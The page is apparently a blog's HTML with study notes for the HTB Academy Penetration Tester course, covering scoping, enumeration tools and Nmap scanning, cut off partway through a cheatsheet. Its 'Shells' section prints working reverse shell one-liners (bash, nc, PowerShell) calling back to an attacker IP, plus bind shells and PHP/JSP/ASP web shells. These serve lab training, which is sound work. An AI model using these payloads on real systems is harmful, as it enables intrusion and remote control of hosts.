<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self'; form-action 'self'; frame-src 'self'; img-src 'self' data: https://*.google-analytics.com https://*.googletagmanager.com; object-src 'none'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' https://*.googletagmanager.com; prefetch-src 'self'; connect-src 'self' https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB Academy: Penetration Tester | woadey</title>
<meta name=keywords content="htb,hackthebox,academy,Pentest"><meta name=description content="Notes on HTB Academy – Penetration Tester"><meta name=author content><link rel=canonical href=https://woadey.xyz/posts/htb/pentester/><link crossorigin=anonymous href=/assets/css/stylesheet.1e29e54d58ab90b3a17e16bb686f83913075cda65bf7dd9d85dd20d1a57e1f46.css integrity="sha256-HinlTVirkLOhfha7aG+DkTB1zaZb992dhd0g0aV+H0Y=" rel="preload stylesheet" as=style><link rel=icon href=https://woadey.xyz/favicon/pink_trans_bg/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://woadey.xyz/favicon/pink_trans_bg/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://woadey.xyz/favicon/pink_trans_bg/favicon-32x32.png><link rel=apple-touch-icon href=https://woadey.xyz/favicon/white_pink_bg/apple-touch-icon.png><link rel=mask-icon href=https://woadey.xyz/favicon/pink_trans_bg/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://woadey.xyz/posts/htb/pentester/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9703667233476494" crossorigin=anonymous></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-EF924K1NXR"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EF924K1NXR")}</script><meta property="og:title" content="HTB Academy: Penetration Tester"><meta property="og:description" content="Notes on HTB Academy – Penetration Tester"><meta property="og:type" content="article"><meta property="og:url" content="https://woadey.xyz/posts/htb/pentester/"><meta property="og:image" content="https://woadey.xyz/images/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-12-15T05:47:10-05:00"><meta property="article:modified_time" content="2023-12-15T05:47:10-05:00"><meta property="og:site_name" content="woadey's blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://woadey.xyz/images/logo.png"><meta name=twitter:title content="HTB Academy: Penetration Tester"><meta name=twitter:description content="Notes on HTB Academy – Penetration Tester"><meta name=twitter:site content="@woadey_"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"posts","item":"https://woadey.xyz/posts/"},{"@type":"ListItem","position":2,"name":"HTB Academy: Penetration Tester","item":"https://woadey.xyz/posts/htb/pentester/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB Academy: Penetration Tester","name":"HTB Academy: Penetration Tester","description":"Notes on HTB Academy – Penetration Tester","keywords":["htb","hackthebox","academy","Pentest"],"articleBody":"Penetration Testing Overview A Penetration Test (Pentest) is an organized, targeted, and authorized attack attempt to test IT infrastructure and its defenders to determine their susceptibility to IT security vulnerabilities.\nPrecautionary Measures Obtain written consent from the owner or authorized representative of the computer or network being tested Conduct the testing within the scope of the consent obtained only and respect any limitations specified Take measures to prevent causing damage to the systems or networks being tested Do not access, use or disclose personal data or any other information obtained during the testing without permission Do not intercept electronic communications without the consent of one of the parties to the communication Do not conduct testing on systems or networks that are covered by the Health Insurance Portability and Accountability Act (HIPAA) without proper authorization Pre-Engagement Documents Document Timing for Creation 1. Non-Disclosure Agreement (NDA) After Initial Contact 2. Scoping Questionnaire Before the Pre-Engagement Meeting 3. Scoping Document During the Pre-Engagement Meeting 4. Penetration Testing Proposal (Contract/Scope of Work (SoW)) During the Pre-engagement Meeting 5. Rules of Engagement (RoE) Before the Kick-Off Meeting 6. Contractors Agreement (Physical Assessments) Before the Kick-Off Meeting 7. Reports During and after the conducted Penetration Test Critical Scoping Questions How many expected live hosts? How many IPs/CIDR ranges in scope? How many Domains/Subdomains are in scope? How many wireless SSIDs in scope? How many web/mobile applications? If testing is authenticated, how many roles (standard user, admin, etc.)? For a phishing assessment, how many users will be targeted? Will the client provide a list, or we will be required to gather this list via OSINT? If the client is requesting a Physical Assessment, how many locations? If multiple sites are in-scope, are they geographically dispersed? What is the objective of the Red Team Assessment? Are any activities (such as phishing or physical security attacks) out of scope? Is a separate Active Directory Security Assessment desired? Will network testing be conducted from an anonymous user on the network or a standard domain user? Do we need to bypass Network Access Control (NAC)? Types of Penetration Testing Type Information Provided Blackbox Minimal. Only the essential information, such as IP addresses and domains, is provided. Greybox Extended. In this case, we are provided with additional information, such as specific URLs, hostnames, subnets, and similar. Whitebox Maximum. Here everything is disclosed to us. This gives us an internal view of the entire structure, which allows us to prepare an attack using internal information. We may be given detailed configurations, admin credentials, web application source code, etc. Red-Teaming May include physical testing and social engineering, among other things. Can be combined with any of the above types. Purple-Teaming It can be combined with any of the above types. However, it focuses on working closely with the defenders. Penetration Testing Stages Stage Description 1. Pre-Engagement The first step is to create all the necessary documents in the pre-engagement phase, discuss the assessment objectives, and clarify any questions. 2. Information Gathering Once the pre-engagement activities are complete, we investigate the company’s existing website we have been assigned to assess. We identify the technologies in use and learn how the web application functions. 3. Vulnerability Assessment With this information, we can look for known vulnerabilities and investigate questionable features that may allow for unintended actions. 4. Exploitation Once we have found potential vulnerabilities, we prepare our exploit code, tools, and environment and test the webserver for these potential vulnerabilities. 5. Post-Exploitation Once we have successfully exploited the target, we jump into information gathering and examine the webserver from the inside. If we find sensitive information during this stage, we try to escalate our privileges (depending on the system and configurations). 6. Lateral Movement If other servers and hosts in the internal network are in scope, we then try to move through the network and access other hosts and servers using the information we have gathered. 7. Proof-of-Concept We create a proof-of-concept that proves that these vulnerabilities exist and potentially even automate the individual steps that trigger these vulnerabilities. 8. Post-Engagement Finally, the documentation is completed and presented to our client as a formal report deliverable. Afterward, we may hold a report walkthrough meeting to clarify anything about our testing or results and provide any needed support to personnel tasked with remediating our findings. Vulnerability Analysis Types Analysis Type Description Descriptive Descriptive analysis is essential in any data analysis. On the one hand, it describes a data set based on individual characteristics. It helps to detect possible errors in data collection or outliers in the data set. Diagnostic Diagnostic analysis clarifies conditions’ causes, effects, and interactions. Doing so provides insights that are obtained through correlations and interpretation. We must take a backward-looking view, similar to descriptive analysis, with the subtle difference that we try to find reasons for events and developments. Predictive By evaluating historical and current data, predictive analysis creates a predictive model for future probabilities. Based on the results of descriptive and diagnostic analyses, this method of data analysis makes it possible to identify trends, detect deviations from expected values at an early stage, and predict future occurrences as accurately as possible. Prescriptive Prescriptive analytics aims to narrow down what actions to take to eliminate or prevent a future problem or trigger a specific activity or process. Common Vulnerabilities and Exposures (CVEs) Research CVEdetails Exploit DB Vulners Packet Storm Security NIST Practicing Steps 2x Modules (one technical, one offensive)\nRead the module Practice the exercises Complete the module Start the module exercises from scratch While solving the exercises again, take notes Create technical documentation based on the notes Create non-technical documentation based on the notes 3x Retired Machines (two easy, one medium)\nGet the user flag on your own\nGet the root flag on your own\nWrite your technical documentation\nWrite your non-technical documentation\nCompare your notes with the official write-up (or a community write-up if you don’t have a VIP subscription\nCreate a list of information you have missed\nWatch Ippsec’s walkthrough and compare it with your notes\nExpand your notes and documentation by adding the missed parts\n5x Active Machines (two easy, two medium, one hard)\nGet the user and root flag Write your technical documentation Write your non-technical documentation Have it proofread by technical and non-technical persons 1x Pro Lab / Endgame\nComplete Link of Completion\nGetting Started CIA triad: “confidentiality, integrity, and availability of data” A hypervisor is software that allows us to create and run virtual machines (VMs). The ISO file is essentially just a CD-ROM that can be mounted within our hypervisor of choice to build the VM by installing the operating system ourselves. An ISO gives us more room for customization, e.g., keyboard layout, locale, desktop environment switch, custom partitioning, etc., and therefore a more granular approach when setting up our attack VM. The OVA file is a pre-built virtual appliance that contains an OVF XML file that specifies the VM hardware settings and a VMDK, which is the virtual disk that the operating system is installed on. An OVA is pre-built and therefore can be rapidly deployed to get up and running quicker. A virtual private network (VPN) allows us to connect to a private (internal) network and access hosts and resources as if we were directly connected to the target private network. It is a secured communications channel over shared public networks to connect to a private network (i.e., an employee remotely connecting to their company’s corporate network from their home). VPNs provide a degree of privacy and security by encrypting communications over the channel to prevent eavesdropping and access to data traversing the channel. netstat -rn will show us the networks accessible via the VPN. Common Ports Port(s) Protocol 20/21 (TCP) FTP 22 (TCP) SSH 23 (TCP) Telnet 25 (TCP) SMTP 80 (TCP) HTTP 161 (TCP/UDP) SNMP 389 (TCP/UDP) LDAP 443 (TCP) SSL/TLS (HTTPS) 445 (TCP) SMB 3389 (TCP) RDP Tools Secure Shell (SSH) is a network protocol that runs on port 22 by default and provides users such as system administrators a secure way to access a computer remotely. Netcat, ncat, or nc, is an excellent network utility for interacting with TCP/UDP ports. There’s another Windows alternative to netcat coded in PowerShell called PowerCat. Another similar network utility is socat, which has a few features that netcat does not support, like forwarding ports and connecting to serial devices. Socat can also be used to upgrade a shell to a fully interactive TTY. Terminal multiplexers, like tmux or Screen, are great utilities for expanding a standard Linux terminal’s features, like having multiple windows within one terminal and jumping between them. Vim is a great text editor that can be used for writing code or editing text files on Linux systems. -nmap for network enumeration and vulnerability scanning. nmap -sV --script=banner -p and nc -nv can be used for Banner Grabbing A tool that can enumerate and interact with SMB shares is smbclient. SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of public and private are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed. woadey@htb[/htb]$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0 iso.3.6.1.2.1.1.5.0 = STRING: \"gs-svcscan\" woadey@htb[/htb]$ snmpwalk -v 2c -c private 10.129.42.253 Timeout: No Response from 10.129.42.253 A tool such as onesixtyone can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool. woadey@htb[/htb]$ onesixtyone -c dict.txt 10.129.42.254 Scanning 1 hosts, 51 communities 10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64 We can use a tool such as ffuf or GoBuster to perform this directory enumeration. woadey@htb[/htb]$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.121/ [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/12/11 21:47:25 Starting gobuster =============================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /index.php (Status: 200) /server-status (Status: 403) /wordpress (Status: 301) =============================================================== 2020/12/11 21:47:46 Finished =============================================================== We can use cURL to retrieve server header information from the command line. cURL can also pull down files. woadey@htb[/htb]$ curl -IL https://www.inlanefreight.com HTTP/1.1 200 OK Date: Fri, 18 Dec 2020 22:24:05 GMT Server: Apache/2.4.29 (Ubuntu) Link: ; rel=\"https://api.w.org/\" Link: ; rel=shortlink Content-Type: text/html; charset=UTF-8 woadey@htb[/htb]$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh 100 144k 100 144k 0 0 176k 0 --:--:-- --:--:-- --:--:-- 176k Another handy tool is EyeWitness, which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials. We can extract the version of web servers, supporting frameworks, and applications using the command-line tool whatweb. woadey@htb[/htb]$ whatweb 10.10.10.121 http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()] woadey@htb[/htb]$ whatweb --no-errors 10.10.10.0/24 http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1] http://10.10.10.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.100], Title[File Sharing Service] http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()] http://10.10.10.247 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@cross-fit.htb], Frame, HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.247], JQuery[3.3.1], PHP[7.4.12], Script, Title[Fine Wines], X-Powered-By[PHP/7.4.12], X-UA-Compatible[ie=edge] One method to transfer files would be using scp, granted we have obtained ssh user credentials on the remote host. woadey@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh user@remotehost's password: ********* linenum.sh In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. woadey@htb[/htb]$ base64 shell -w 0 f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d \u003e shell Shells A Reverse Shell is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. Payload All The Things has many reverse shell payloads: Linux Victim\nbash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.10.10/1234 0\u003e\u00261' ...or... rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.10.10 1234 \u003e/tmp/f Windows Victim\npowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u003e\u00261 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '\u003e ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\" Another type of shell is a Bind Shell. Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets’ listening port. Once we execute a Bind Shell Command, it will start listening on a port on the remote host and bind that host’s shell, i.e., Bash or PowerShell, to that port. We have to connect to that port with netcat, and we will get control through a shell on that system. Payload All the Things again has payloads for this. Linux Victim\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u003e\u00261|nc -lvp 1234 \u003e/tmp/f ...or... python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")' Windows Victim\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u003e\u00261 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \" \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(); The final type of shell we have is a Web Shell. A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page. php\n\u003c?php system($_REQUEST[\"cmd\"]); ?\u003e jsp\n\u003c% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %\u003e asp\n\u003c% eval request(\"cmd\") %\u003e PrivEsc Checklists Once we gain initial access to a box, we want to thoroughly enumerate the box to find any potential vulnerabilities we can exploit to achieve a higher privilege level. We can find many checklists and cheat sheets online that have a collection of checks we can run and the commands to run these checks. One excellent resource is HackTricks, which has an excellent checklist for both Linux and Windows local privilege escalation. Another excellent repository is PayloadsAllTheThings, which also has checklists for both Linux and Windows. We must start experimenting with various commands and techniques and get familiar with them to understand multiple weaknesses that can lead to escalating our privileges.\nEnumeration Scripts Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include LinEnum and linuxprivchecker, and for Windows include Seatbelt and JAWS.\nAnother useful tool we may use for server enumeration is the Privilege Escalation Awesome Scripts SUITE (PEASS), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.\nGTFOBins contains a list of commands and how they can be exploited through sudo\nLOLBAS also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.\nPractice Resources Platform Description OWASP Juice Shop Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire OWASP Top Ten along with many other real-world application security flaws. Metasploitable 2 Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation. Metasploitable 3 Is a template for building a vulnerable Windows VM configured with a wide range of vulnerabilities. DVWA This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty. IppSec Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques. VbScrub Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation. STÖK Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing. LiveOverflow Provides videos on a wide variety of technical infosec topics. First Attack For an entire write-up of this box, see HTB Writeup: Nibbles.\nComplete Link of Completion\nNetwork Enumeration with Nmap Nmap Architecture Host discovery Port scanning Service enumeration and detection OS detection Scriptable interaction with the target service (Nmap Scripting Engine) TCP-SYN Scan The TCP-SYN scan (-sS) is one of the default settings unless we have defined otherwise and is also one of the most popular scan methods. This scan method makes it possible to scan several thousand ports per second. The TCP-SYN scan sends one packet with the SYN flag and, therefore, never completes the three-way handshake, which results in not establishing a full TCP connection to the scanned port.\nIf our target sends an SYN-ACK flagged packet back to the scanned port, Nmap detects that the port is open. If the packet receives an RST flag, it is an indicator that the port is closed. If Nmap does not receive a packet back, it will display it as filtered. Depending on the firewall configuration, certain packets may be dropped or ignored by the firewall. Scan Network Range woadey@htb[/htb]$ sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\" \" -f5 10.129.2.4 10.129.2.10 10.129.2.11 10.129.2.18 10.129.2.19 10.129.2.20 10.129.2.28 Scanning Options Description 10.129.2.0/24 Target network range. -sn Disables port scanning. -oA tnet Stores the results in all formats starting with the name ’tnet'. Scan IP List woadey@htb[/htb]$ sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5 10.129.2.18 10.129.2.19 10.129.2.20 Scanning Options Description -sn Disables port scanning. -oA tnet Stores the results in all formats starting with the name ’tnet'. -iL Performs defined scans against targets in provided ‘hosts.lst’ list. Scan Multiple IPs woadey@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d\" \" -f5 10.129.2.18 10.129.2.19 10.129.2.20 woadey@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18-20| grep for | cut -d\" \" -f5 10.129.2.18 10.129.2.19 10.129.2.20 Scan Single IP woadey@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 23:59 CEST Nmap scan report for 10.129.2.18 Host is up (0.087s latency). MAC Address: DE:AD:00:00:BE:EF Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds Scanning Options Description 10.129.2.18 Performs defined scans against the target. -sn Disables port scanning. -oA host Stores the results in all formats starting with the name ‘host’. *If we disable port scan (-sn), Nmap automatically ping scan with ICMP Echo Requests (-PE). Once such a request is sent, we usually expect an ICMP reply if the pinging host is alive. The more interesting fact is that our previous scans did not do that because before Nmap could send an ICMP echo request, it would send an ARP ping resulting in an ARP reply. We can confirm this with the “--packet-trace” option. To ensure that ICMP echo requests are sent, we also define the option (-PE) for this.\nwoadey@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:08 CEST SENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2 RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF Nmap scan report for 10.129.2.18 Host is up (0.023s latency). MAC Address: DE:AD:00:00:BE:EF Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds Scanning Options Description 10.129.2.18 Performs defined scans against the target. -sn Disables port scanning. -oA host Stores the results in all formats starting with the name ‘host’. -PE Performs the ping scan by using ‘ICMP Echo requests’ against the target. --packet-trace Shows all packets sent and received. woadey@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --reason Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:10 CEST SENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2 RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF Nmap scan report for 10.129.2.18 Host is up, received arp-response (0.028s latency). MAC Address: DE:AD:00:00:BE:EF Nmap done: 1 IP address (1 host up) scanned in 0.03 seconds Scanning Options Description 10.129.2.18 Performs defined scans against the target. -sn Disables port scanning. -oA host Stores the results in all formats starting with the name ‘host’. -PE Performs the ping scan by using ‘ICMP Echo requests’ against the target. --reason Displays the reason for specific result. Nmap Cheatsheet Scanning Options\nNmap Option Description 10.10.10.0/24 Target network range. -sn Disables port scanning. -Pn Disables ICMP Echo Requests -n Disables DNS Resolution. -PE Performs the ping scan by using ICMP Echo Requests against the target. --packet-trace Shows all packets sent and received. --reason Displays the reason for a specific result. --disable-arp-ping Disables ARP Ping Requests. --top-ports= Scans the specified top ports that have been defined as most frequent. -p- Scan all ports. -p22-110 Scan all ports between 22 and 110. -p22,25 Scans only the specified ports 22 and 25. -F Scans top 100 ports. -sS Performs an TCP SYN-Scan. -sA Performs an TCP ACK-Scan. -sU Performs an UDP Scan. -sV Scans the discovered services for their versions. -sC Perform a Script Scan with scripts that are categorized as “default”. --script ","wordCount":"30086","inLanguage":"en","image":"https://woadey.xyz/images/logo.png","datePublished":"2023-12-15T05:47:10-05:00","dateModified":"2023-12-15T05:47:10-05:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://woadey.xyz/posts/htb/pentester/"},"publisher":{"@type":"Organization","name":"woadey","logo":{"@type":"ImageObject","url":"https://woadey.xyz/favicon/pink_trans_bg/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://woadey.xyz/ accesskey=h title="oadey (Alt + H)"><img src=/images/pink.jpeg srcset="/images/pink_hu17913946300421030964.webp 32w, /images/pink_hu18268070055743548763.webp 120w" sizes=32px height=32 width=32 alt=logo aria-label=logo>
oadey</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://woadey.xyz/posts/ title=posts><span>posts</span></a></li><li><a href=https://woadey.xyz/categories/ title=categories><span>categories</span></a></li><li><a href=https://woadey.xyz/tags/ title=tags><span>tags</span></a></li><li><a href=https://woadey.xyz/archives/ title=archives><span>archives</span></a></li><li><a href=https://woadey.xyz/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://woadey.xyz/>home</a>&nbsp;»&nbsp;<a href=https://woadey.xyz/posts/>posts</a></div><h1 class="post-title entry-hint-parent">HTB Academy: Penetration Tester</h1><div class=post-description>Notes on HTB Academy – Penetration Tester</div><div class=post-meta><span title='2023-12-15 05:47:10 -0500 -0500'>December 15, 2023</span>&nbsp;·&nbsp;142 min</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#penetration-testing-overview>Penetration Testing Overview</a><ul><li><a href=#precautionary-measures>Precautionary Measures</a></li><li><a href=#pre-engagement-documents>Pre-Engagement Documents</a></li><li><a href=#critical-scoping-questions>Critical Scoping Questions</a></li><li><a href=#types-of-penetration-testing>Types of Penetration Testing</a></li><li><a href=#penetration-testing-stages>Penetration Testing Stages</a></li><li><a href=#vulnerability-analysis-types>Vulnerability Analysis Types</a></li><li><a href=#common-vulnerabilities-and-exposures-cves-research>Common Vulnerabilities and Exposures (CVEs) Research</a></li><li><a href=#practicing-steps>Practicing Steps</a></li><li><a href=#complete>Complete</a></li></ul></li><li><a href=#getting-started>Getting Started</a><ul><li><a href=#common-ports>Common Ports</a></li><li><a href=#tools>Tools</a></li><li><a href=#shells>Shells</a></li><li><a href=#privesc-checklists>PrivEsc Checklists</a></li><li><a href=#enumeration-scripts>Enumeration Scripts</a></li><li><a href=#practice-resources>Practice Resources</a></li><li><a href=#first-attack>First Attack</a></li><li><a href=#complete-1>Complete</a></li></ul></li><li><a href=#network-enumeration-with-nmap>Network Enumeration with Nmap</a><ul><li><a href=#nmap-architecture>Nmap Architecture</a></li><li><a href=#tcp-syn-scan>TCP-SYN Scan</a></li><li><a href=#scan-network-range>Scan Network Range</a></li><li><a href=#scan-ip-list>Scan IP List</a></li><li><a href=#scan-multiple-ips>Scan Multiple IPs</a></li><li><a href=#scan-single-ip>Scan Single IP</a></li><li><a href=#nmap-cheatsheet>Nmap Cheatsheet</a></li><li><a href=#host-and-port-scanning>Host and Port Scanning</a></li><li><a href=#nmap-scripting-engine-nse>Nmap Scripting Engine (NSE)</a></li><li><a href=#decoys>Decoys</a></li><li><a href=#complete-2>Complete</a></li></ul></li><li><a href=#footprinting>Footprinting</a><ul><li><a href=#enumeration-principles>Enumeration Principles</a></li><li><a href=#enumeration-methodology>Enumeration Methodology</a></li><li><a href=#ftp>FTP</a></li><li><a href=#smb>SMB</a></li><li><a href=#nfs>NFS</a></li><li><a href=#dns>DNS</a></li><li><a href=#imap--pop3>IMAP / POP3</a></li><li><a href=#snmp>SNMP</a></li><li><a href=#mysql>MySQL</a></li><li><a href=#mssql>MSSQL</a></li><li><a href=#ipmi>IPMI</a></li><li><a href=#ssh>SSH</a></li><li><a href=#rsync>Rsync</a></li><li><a href=#r-services>R-Services</a></li><li><a href=#rdp>RDP</a></li><li><a href=#windows-remote-management-winrm>Windows Remote Management (WinRM)</a></li><li><a href=#wmi>WMI</a></li><li><a href=#infrastructure-based-enumeration-cheatsheet>Infrastructure-based Enumeration Cheatsheet</a></li><li><a href=#host-based-enumeration-cheatsheet>Host-based Enumeration Cheatsheet</a></li><li><a href=#complete-3>Complete</a></li></ul></li><li><a href=#information-gathering>Information Gathering</a><ul><li><a href=#whois>WHOIS</a></li><li><a href=#dns-1>DNS</a></li><li><a href=#passive-subdomain-enumeration>Passive Subdomain Enumeration</a></li><li><a href=#passive-infrastructure-identification>Passive Infrastructure Identification</a></li><li><a href=#active-infrastructure-identification>Active Infrastructure Identification</a></li><li><a href=#active-subdomain-enumeration>Active Subdomain Enumeration</a></li><li><a href=#virtual-hosts>Virtual Hosts</a></li><li><a href=#crawling>Crawling</a></li><li><a href=#search-engine-discovery>Search Engine Discovery</a></li></ul></li><li><a href=#automating-recon>Automating Recon</a><ul><li><a 